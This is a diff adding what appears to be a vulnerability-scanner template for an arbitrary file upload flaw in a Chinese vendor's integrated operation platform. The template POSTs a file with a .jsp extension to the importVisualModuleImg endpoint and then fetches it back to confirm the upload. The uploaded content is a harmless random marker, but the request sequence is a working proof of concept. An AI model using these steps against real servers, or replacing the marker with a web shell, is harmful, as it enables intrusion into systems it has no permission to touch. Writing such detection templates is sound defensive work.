@@ -1,0 +1,52 @@
+id: poc-yaml-integrated-operation-platform-importvisualmoduleimg-anyfile-upload
+info:
+  name: 北京中科聚网一体化运营平台 importVisualModuleImg 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for a file upload vulnerability in the 北京中科聚网一体化运营平台 (Integrated Operation Platform) via the importVisualModuleImg endpoint.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/manage/tplresource/importVisualModuleImg?moduleId=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9b48b67cf71
+    body: |-
+      ------9979a3f1-cdb1-43af-af88-a9b48b67cf71
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: multipart/form-data
+
+      {{t2}}
+      ------9979a3f1-cdb1-43af-af88-a9b48b67cf71--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "files/visual/img"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/files/visual/img/1/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
